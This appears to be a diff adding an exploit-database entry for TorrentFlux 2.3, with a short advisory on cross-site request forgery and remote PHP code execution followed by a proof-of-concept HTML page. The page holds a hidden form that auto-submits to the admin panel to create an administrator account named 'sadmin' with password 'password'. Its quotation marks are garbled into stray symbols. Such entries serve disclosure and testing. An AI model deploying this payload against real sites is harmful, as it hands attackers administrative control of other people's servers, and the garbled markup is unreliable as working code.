@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28846/info
+
+TorrentFlux is prone to a cross-site request-forgery vulnerability and a remote PHP code-execution vulnerability.
+
+Exploiting these issues may allow a remote attacker to create administrative accounts in the application or to execute arbitrary PHP script code. This may facilitate the remote compromise of affected computers.
+
+TorrentFlux 2.3 is vulnerable; other versions may also be affected.
+
+<html> Add an admistrative account: <form id=?create_admin? method=?post? action=?http://localhost/torrentflux_2.3/html/admin.php?op=addUser?> <input type=hidden name=?newUser? value=?sadmin?> <input type=hidden name=?pass1&#8243; value=?password?> <input type=hidden name=?pass2&#8243; value=?password?> <input type=hidden name=?userType? value=1> <input type=submit value=?create admin?> </form> </html> <script> document.getElementById(?create_admin?).submit(); </script> 
